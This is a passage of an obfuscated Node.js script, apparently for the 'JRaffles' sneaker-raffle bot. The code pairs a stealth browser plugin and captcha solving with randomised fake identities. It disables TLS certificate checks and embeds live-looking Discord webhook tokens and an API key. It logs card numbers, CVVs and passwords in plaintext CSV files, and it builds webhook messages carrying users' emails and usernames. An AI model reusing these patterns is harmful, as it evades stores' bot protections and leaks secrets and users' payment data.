process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x65e0bc = require('fs'), _0x399e7a = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x223360(_0x4c4271) {
    const _0x2fd028 = _0x65e0bc['createWriteStream'](_0x4c4271, { 'flags': 'a' }), _0x1ebcdd = console['log'];
    console['log'] = function () {
        const _0x35f3da = Array['prototype']['slice']['call'](arguments), _0x4b51b7 = _0x35f3da['join']('\x20') + '\x0a';
        _0x2fd028['write'](_0x4b51b7), _0x1ebcdd['apply'](console, _0x35f3da);
    };
}
_0x223360('../logs/log\x20' + _0x399e7a);
var _0x2b0e83 = require('tough-cookie'), _0x3e4e8d = require('node-imap'), _0x16170f = require('util')['inspect'];
const _0x300bc8 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x3de3a3 } = require('discord.js');
var _0x5ddab8 = require('exe');
const { execFile: _0x4ce369 } = require('child_process'), _0x5d136d = require('puppeteer-extra'), _0xe5ec8f = require('puppeteer-extra-plugin-recaptcha'), _0x2ce6bf = require('puppeteer-extra-plugin-stealth'), _0x1403a4 = require('chalk'), _0x244762 = require('node-bash-title'), _0x5d1b21 = require('axios'), _0x3e0e2d = require('papaparse');
var _0x31b037 = require('random-name');
const _0x225fcc = require('request');
var _0xab4dc6 = require('prompt');
const _0x103baf = _0x225fcc['jar']();
var _0x51d52a = {};
const _0x48399b = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x1d9568 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x3b02ce = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x3d649b = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x1922fd = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x473483 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x2d7c08 = 'https://discord.com/api/webhooks/', _0x58a2d0 = '' + _0x2d7c08 + _0x3b02ce, _0x431ce7 = '' + _0x2d7c08 + _0x3d649b, _0x5317eb = '' + _0x2d7c08 + _0x48399b, _0x802c1e = '' + _0x2d7c08 + _0x1d9568, _0x55a106 = '' + _0x2d7c08 + _0x1922fd, _0x7cc4fb = '' + _0x2d7c08 + _0x473483;
const _0x164a06 = JSON['parse'](_0x65e0bc['readFileSync']('../package.json', 'utf-8')), _0x3b2d4c = _0x164a06['version'];
var _0x214f6f, _0x1d31f7, _0x4df38a, _0x53258f, _0x5a13e6, _0x459e4e, _0x358285, _0x4f1e3f;
const _0x5b2b6c = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x471b05 = ![];
const _0x58ad1a = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x4aa7f2 = '0123456789';
var _0x492fe9 = _0x58ad1a['split']('');
const _0x4096f3 = require('auto-git-update'), _0x4b457b = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x141a06 = new _0x4096f3(_0x4b457b);
async function _0x2b1268() {
    _0x5a13e6 = _0x65e0bc['readdirSync']('../proxies'), _0x53258f = _0x65e0bc['readdirSync']('../tasks'), !_0x65e0bc['existsSync']('../accounts/fenom.csv') && _0x65e0bc['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x65e0bc['existsSync']('../accounts/paypal.csv') && _0x65e0bc['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x65e0bc['existsSync']('../accounts/bstn.csv') && _0x65e0bc['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x65e0bc['existsSync']('../accounts/eql.csv') && _0x65e0bc['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x65e0bc['existsSync']('../failed-tasks.csv') && _0x65e0bc['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x65e0bc['existsSync']('../successful-tasks.csv') && _0x65e0bc['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x51d52a = JSON['parse'](_0x65e0bc['readFileSync']('../settings.json', 'utf-8')), !_0x51d52a['delay'] && (_0x51d52a['delay'] = 0x3c, _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), !_0x51d52a['threads'] && (_0x51d52a['threads'] = 0x1, _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), !_0x51d52a['masterMail'] && (_0x51d52a['masterMail'] = 'yourmail@gmail.com', _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), !_0x51d52a['masterPassword'] && (_0x51d52a['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), !_0x51d52a['captchaKey'] && (_0x51d52a['captchaKey'] = '', _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), !_0x51d52a['useRandomProxy'] && (_0x51d52a['useRandomProxy'] = !![], _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), !_0x51d52a['shuffleTasks'] && (_0x51d52a['shuffleTasks'] = ![], _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), !_0x51d52a['webhook'] && (_0x51d52a['webhook'] = '', _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), _0x51d52a['delay'] <= 0x1388 && (_0x51d52a['delay'] = _0x51d52a['delay'] * 0x3e8), _0x51d52a['AfewDelay'] && (delete _0x51d52a['AfewDelay'], _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), _0x51d52a['MahaDelay'] && (delete _0x51d52a['MahaDelay'], _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), _0x51d52a['footshopDelay'] && (delete _0x51d52a['footshopDelay'], _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), _0x51d52a['MahaDelay'] = _0x51d52a['delay'], _0x2d7c08 = _0x51d52a['webhook'], _0x459e4e = _0x51d52a['licenseKey'];
}
let _0x45528b, _0x30ecdd = [], _0x2a3341;
const _0x116d4a = _0x15f2a4 => new Promise(_0x23dce5 => setTimeout(_0x23dce5, _0x15f2a4));
function _0x1053b1(_0x337182, _0x3223ec) {
    return Math['floor'](Math['random']() * (_0x3223ec - _0x337182 + 0x1) + _0x337182);
}
function _0x2cf6dd(_0x3acb32) {
    let _0x43bd28 = _0x3acb32['length'], _0x7eb940;
    while (_0x43bd28 != 0x0) {
        _0x7eb940 = Math['floor'](Math['random']() * _0x43bd28), _0x43bd28--, [_0x3acb32[_0x43bd28], _0x3acb32[_0x7eb940]] = [
            _0x3acb32[_0x7eb940],
            _0x3acb32[_0x43bd28]
        ];
    }
    return _0x3acb32;
}
async function _0x38b12c(_0x2096d0) {
    return _0x5d1b21['get']('https://api.hyper.co/v4/licenses/' + _0x2096d0, { 'headers': { 'Authorization': 'Bearer\x20' + _0x5b2b6c } })['then'](_0x4b7b51 => _0x4b7b51['data'])['catch'](() => null);
}
;
async function _0x22cdfb(_0xde2cce) {
    console['clear']();
    if (_0xde2cce == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x2037c7 = await _0xab4dc6['get']('License');
        if (_0x2037c7['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x116d4a(0xbb8), _0x22cdfb(_0xde2cce);
        _0xde2cce = _0x2037c7['License'], _0x51d52a['licenseKey'] = _0xde2cce, _0x459e4e = _0xde2cce, _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a));
    }
    console['log']('Checking\x20license\x20' + _0x459e4e + '...'), await _0x116d4a(0x320);
    const _0x333169 = await _0x38b12c(_0xde2cce);
    _0x358285 = JSON['stringify'](_0x333169['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x4f1e3f = JSON['stringify'](_0x333169['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x333169)
        return console['log']('License\x20not\x20found');
    if (!_0x333169['user'])
        return console['log']('License\x20not\x20bound');
    return _0x333169['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x471b05 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x471b05 = ![]);
}
async function _0x48764d() {
    var _0x5d8a6f = await _0xab4dc6['get']('Module');
    return console['clear'](), _0x5d8a6f['Module'];
}
;
async function _0x5dd5e8() {
    var _0x3d0e95 = await _0xab4dc6['get']('Setting');
    return console['clear'](), _0x3d0e95['Setting'];
}
async function _0xb9dc1e(_0x2ee21e) {
    var _0x3aa962 = [];
    for (file of _0x53258f) {
        var _0x5c4a7b = _0x65e0bc['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x3e0e2d['parse'](_0x5c4a7b, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x2ee21e['store'] && _0x3aa962['push'](file);
    }
    !_0x3aa962['length'] == 0x0 && (_0x53258f = _0x3aa962);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x3dad35 = 0x0; _0x3dad35 < _0x53258f['length']; _0x3dad35++) {
        console['log']('\x20(' + _0x3dad35 + ')\x20' + _0x53258f[_0x3dad35]);
    }
    console['log']('');
    var _0x40e06a = await _0xab4dc6['get']('Task');
    if (_0x40e06a['Task'] > _0x53258f['length'] - 0x1 || isNaN(_0x40e06a['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x116d4a(0x3e8), _0xb9dc1e();
    var _0x5a0e92 = _0x65e0bc['readFileSync']('../tasks/' + _0x53258f[_0x40e06a['Task']], 'utf-8');
    return _0x4df38a = _0x3e0e2d['parse'](_0x5a0e92, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x1403a4['blue'](_0x53258f[_0x40e06a['Task']])), _0x214f6f = _0x53258f[_0x40e06a['Task']], _0x4df38a;
}
async function _0x1083d0() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x39ceb9 = 0x0; _0x39ceb9 < _0x5a13e6['length']; _0x39ceb9++) {
        console['log']('\x20(' + _0x39ceb9 + ')\x20' + _0x5a13e6[_0x39ceb9]);
    }
    console['log']('');
    var _0x4c3508 = await _0xab4dc6['get']('Proxies');
    if (_0x4c3508['Proxies'] > _0x5a13e6['length'] - 0x1 || isNaN(_0x4c3508['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x116d4a(0x3e8), _0x1083d0();
    var _0x4611d5 = _0x65e0bc['readFileSync']('../proxies/' + _0x5a13e6[_0x4c3508['Proxies']], 'utf-8')['split']('\x0a');
    let _0x5d4e0a = _0x4611d5['map']((_0x5772dd, _0x3d0f1e) => {
        sanatizeProxy = _0x5772dd['replace']('\x0d', '');
        if (_0x4611d5[_0x3d0f1e + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x1d31f7 = _0x5a13e6[_0x4c3508['Proxies']], console['clear'](), _0x5d4e0a;
}
async function _0x373407() {
    var _0x34213c = await _0xab4dc6['get']('Value');
    return console['clear'](), _0x34213c['Value'];
}
async function _0x11d57e(_0x549d9b) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x421810 = 0x0; _0x421810 < _0x549d9b['length']; _0x421810++) {
        console['log']('\x20(' + _0x421810 + ')\x20[' + _0x549d9b[_0x421810]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x22ff86 = await _0xab4dc6['get']('Module');
    return _0x22ff86['Module'];
}
async function _0x3234cc() {
    var _0x4f11b7 = await _0xab4dc6['get']('Password');
    return console['clear'](), _0x4f11b7['Password'];
}
;
async function _0x2c26c3() {
    var _0x3fae00 = await _0xab4dc6['get']('Links');
    return _0x3fae00['Links'];
}
;
async function _0x534960() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x4eea36 = 0x0; _0x4eea36 < _0x30ecdd['length']; _0x4eea36++) {
        console['log']('\x20(' + _0x4eea36 + ')\x20' + _0x30ecdd[_0x4eea36]);
    }
    ;
    console['log']();
    let _0x576b88 = await _0xab4dc6['get']('Product');
    return console['clear'](), _0x576b88['Product'];
}
;
function _0x3982db() {
    var _0x4cbbf1 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x4cbbf1;
}
;
function _0x1f2aee() {
    var _0x12ebd0 = new Date(Date['now']())['toLocaleString']();
    return _0x12ebd0['replace'](',', '');
}
async function _0x3c7bbe(_0x3bade4, _0x4f06b8) {
    let _0x2565bd = { 'headers': { 'content-type': 'application/json' } };
    if (_0x3b2d4c != 'devkey') {
        await _0x5d1b21['post'](_0x3bade4, _0x4f06b8, _0x2565bd);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x2520f4(_0x526497, _0x2662c3, _0x29f882, _0x28f60f, _0x3a020e) {
    if (!_0x28f60f && _0x29f882 == 'dev') {
        var _0x2f59da = new _0x3de3a3()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x2662c3['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x2662c3['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x526497['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x51d52a['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x358285,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x526497['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x526497['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x3b2d4c,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x2f59da['data'];
    } else {
        if (_0x28f60f && _0x29f882 == 'dev') {
            var _0x2f59da = new _0x3de3a3()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x2662c3['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x358285,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x2662c3['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x526497['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x51d52a['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x3a020e,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x526497['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x526497['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x3b2d4c,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x2f59da['data'];
        } else {
            if (_0x29f882 == 'pub') {
                var _0x2f59da = new _0x3de3a3()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x2662c3['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x2662c3['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x526497['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x51d52a['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x526497['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x3b2d4c,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x2f59da['data'];
            } else {
                if (_0x29f882 == 'acc' && !_0x28f60f) {
                    var _0x2f59da = new _0x3de3a3()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x2662c3['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x358285,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x2662c3['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x51d52a['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x3b2d4c,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x2f59da['data'];
                } else {
                    if (_0x29f882 == 'acc' && _0x28f60f) {
                        var _0x2f59da = new _0x3de3a3()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x2662c3['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x358285,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x3a020e,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x2662c3['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x51d52a['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x3b2d4c,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x2f59da['data'];
                    } else {
                        if (_0x29f882 == 'open') {
                            var _0x2f59da = new _0x3de3a3()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x4f1e3f)['addFields']({
                                'name': 'User',
                                'value': '' + _0x358285,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x3b2d4c,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x2f59da['data'];
                        } else {
                            if (!_0x28f60f && _0x29f882 == 'ver') {
                                var _0x2f59da = new _0x3de3a3()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x2662c3['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x358285,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x2662c3['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x51d52a['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x3b2d4c,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x2f59da['data'];
                            } else {
                                if (_0x28f60f && _0x29f882 == 'ver') {
                                    var _0x2f59da = new _0x3de3a3()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x2662c3['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x358285,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x3a020e,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x2662c3['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x51d52a['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x3b2d4c,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x2f59da['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x2c2316(_0x4128f8, _0xeb2b1c) {
    var _0x1b501c = _0x4128f8[_0xeb2b1c]['Address1']['split'](''), _0x8615c5 = _0x4128f8[_0xeb2b1c]['Address2']['split'](''), _0x18533a = _0x4128f8[_0xeb2b1c]['Email']['split']('@');
    for (var _0x463bc2 = 0x0; _0x463bc2 < _0x1b501c['length']; _0x463bc2++) {
        if (_0x1b501c[_0x463bc2] == 'X') {
            var _0x574e84 = Math['round'](Math['random']() * (_0x58ad1a['length'] - 0x1));
            _0x1b501c[_0x463bc2] = _0x492fe9[_0x574e84];
        }
    }
    ;
    for (var _0x463bc2 = 0x0; _0x463bc2 < _0x8615c5['length']; _0x463bc2++) {
        if (_0x8615c5[_0x463bc2] == 'X') {
            var _0x574e84 = Math['round'](Math['random']() * (_0x58ad1a['length'] - 0x1));
            _0x8615c5[_0x463bc2] = _0x492fe9[_0x574e84];
        }
    }
    ;
    _0x4128f8[_0xeb2b1c]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x4128f8[_0xeb2b1c]['FirstName'] = _0x31b037['first']());
    _0x4128f8[_0xeb2b1c]['LastName']['toUpperCase']() == 'RANDOM' && (_0x4128f8[_0xeb2b1c]['LastName'] = _0x31b037['last']());
    _0x18533a[0x0]['toUpperCase']() == 'RANDOM' ? _0x18533a[0x0] = '' + _0x31b037['first']() + _0x31b037['last']() + _0x1053b1(0x1, 0x3e7) + '@' : _0x18533a[0x0] = _0x18533a[0x0] + '@';
    _0x4128f8[_0xeb2b1c]['Email'] = _0x18533a['join'](''), _0x4128f8[_0xeb2b1c]['Address1'] = _0x1b501c['join'](''), _0x4128f8[_0xeb2b1c]['Address2'] = _0x8615c5['join']('');
    _0x4128f8[_0xeb2b1c]['Phone'] == 'RANDOM' && (_0x4128f8[_0xeb2b1c]['Phone'] = '0' + _0x1053b1(0x5f5e100, 0x3b9ac9ff));
    if (_0x4128f8[_0xeb2b1c]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x4e8024 = _0x1053b1(0x1, 0x270f);
        _0x4128f8[_0xeb2b1c]['Follower'] = '' + _0x31b037['first']() + _0x31b037['last']() + _0x4e8024 + '\x20';
    }
    _0x4128f8[_0xeb2b1c]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x4128f8[_0xeb2b1c]['HouseNumber'] = _0x1053b1(0x1, 0xc8));
    if (_0x4128f8[_0xeb2b1c]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x19c7d6 = Math['round'](Math['random']() * (_0x58ad1a['length'] - 0x1)), _0x559256 = _0x492fe9[_0x19c7d6];
        _0x4128f8[_0xeb2b1c]['Address1'] = _0x31b037['last']() + 'straat', _0x4128f8[_0xeb2b1c]['Zip'] == '' && (_0x4128f8[_0xeb2b1c]['Postcode'] = _0x1053b1(0x3e8, 0x270f) + '\x20' + _0x559256 + _0x559256, _0x4128f8[_0xeb2b1c]['Zip'] = _0x4128f8[_0xeb2b1c]['Postcode']), _0x4128f8[_0xeb2b1c]['HouseNumber'] = '' + _0x1053b1(0x1, 0xc8);
    }
    return;
}
;
async function _0x5925c7(_0x3e096d, _0x565647) {
    _0x65e0bc['appendFileSync']('../failed-tasks.csv', _0x1f2aee() + ',' + _0x565647['store'] + ',' + _0x565647['name'] + ',' + _0x3e096d['Url'] + ',' + _0x3e096d['Size'] + ',' + _0x3e096d['Follower'] + ',' + _0x3e096d['FirstName'] + ',' + _0x3e096d['LastName'] + ',' + _0x3e096d['Address1'] + ',' + _0x3e096d['Address2'] + ',' + _0x3e096d['HouseNumber'] + ',' + _0x3e096d['Zip'] + ',' + _0x3e096d['City'] + ',' + _0x3e096d['State'] + ',' + _0x3e096d['Country'] + ',' + _0x3e096d['Phone'] + ',' + _0x3e096d['Email'] + ',' + _0x3e096d['Password'] + ',' + _0x3e096d['PaymentMethod'] + ',' + _0x3e096d['CardType'] + ',' + _0x3e096d['NameOnCard'] + ',' + _0x3e096d['CardNumber'] + ',' + _0x3e096d['ExpiryDate'] + ',' + _0x3e096d['CVV'] + ',' + _0x3e096d['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x523ce4(_0x554d25, _0x5f567b) {
    _0x65e0bc['appendFileSync']('../successful-tasks.csv', _0x1f2aee() + ',' + _0x5f567b['store'] + ',' + _0x5f567b['name'] + ',' + _0x554d25['Url'] + ',' + _0x554d25['Size'] + ',' + _0x554d25['Follower'] + ',' + _0x554d25['FirstName'] + ',' + _0x554d25['LastName'] + ',' + _0x554d25['Address1'] + ',' + _0x554d25['Address2'] + ',' + _0x554d25['HouseNumber'] + ',' + _0x554d25['Zip'] + ',' + _0x554d25['City'] + ',' + _0x554d25['State'] + ',' + _0x554d25['Country'] + ',' + _0x554d25['Phone'] + ',' + _0x554d25['Email'] + ',' + _0x554d25['Password'] + ',' + _0x554d25['PaymentMethod'] + ',' + _0x554d25['CardType'] + ',' + _0x554d25['NameOnCard'] + ',' + _0x554d25['CardNumber'] + ',' + _0x554d25['ExpiryDate'] + ',' + _0x554d25['CVV'] + ',' + _0x554d25['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x41c05d() {
    let _0x467ce4 = proxyFile['split']('\x0a'), _0x50fd72 = _0x467ce4['map']((_0x395e45, _0x14c633) => {
        sanatizeProxy = _0x395e45['replace']('\x0d', '');
        if (_0x467ce4[_0x14c633 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x50fd72;
}
;
async function _0x420bf9(_0x4ddb66, _0x18df90) {
    if (_0x5a9a4a != 'yes')
        var _0x5a9a4a = '', _0x4bbdfc = 0x0;
    async function _0x1f2d6c() {
        var _0x2fd97c = _0x65e0bc['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x4da257 = _0x3e0e2d['parse'](_0x2fd97c, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x1ec924 = 0x0; _0x1ec924 < _0x4da257['length']; _0x1ec924++) {
            console['log']('(' + _0x1ec924 + ')\x20' + _0x4da257[_0x1ec924]['Email']);
        }
        console['log']('\x0a(' + _0x4da257['length'] + ')\x20' + _0x1403a4['cyan']('Add\x20a\x20new\x20account'));
        let _0x145e1f = await _0xab4dc6['get']('Option');
        if (_0x145e1f['Option'] < _0x4da257['length'])
            return _0x4da257[_0x145e1f['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
